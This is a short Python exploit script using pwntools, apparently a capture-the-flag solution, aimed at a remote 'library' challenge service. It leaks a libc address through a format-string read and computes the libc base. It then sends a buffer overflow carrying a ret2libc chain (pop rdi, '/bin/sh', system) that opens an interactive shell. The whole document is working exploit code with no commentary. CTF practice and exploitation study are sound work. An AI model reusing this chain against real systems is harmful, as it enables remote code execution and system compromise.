**script:**

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./source_patched")
libc = ELF("./libc6_2.35-0ubuntu3.1_amd64.so")
# p = process([exe.path])
p = remote('ehc-library-7285f7c6.dailycookie.cloud', 30507)

context.binary = exe



# gdb.attach(p, gdbscript = '''
# b*other+75
# b*other+107
# c
# ''')

# input()

payload = b'4'
p.sendlineafter(b'option: ', payload)
payload = b'%19$p|'
p.sendafter(b'>', payload)
# p.sendline(payload)
# p.recvuntil(b'I can not find book: \n')
p.recvline()
# # p.recvuntil(b'0x')
# libc_leak = int(p.recvline()[:-1], 16)
libc_leak = int(p.recvuntil(b'|',drop=True),16)
libc.address = libc_leak - 0x29d90
log.info("libc leak: " + hex(libc_leak))
log.info("libc base: " + hex(libc.address))

pop_rdi = 0x000000000002a3e5 + libc.address
ret_addr = 0x000000000040101a

p.sendlineafter(b'option: ', b'4')
payload = b'a'*56
payload += p64(ret_addr)
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.sym['system'])

p.sendafter(b'>', payload)
p.interactive()



```
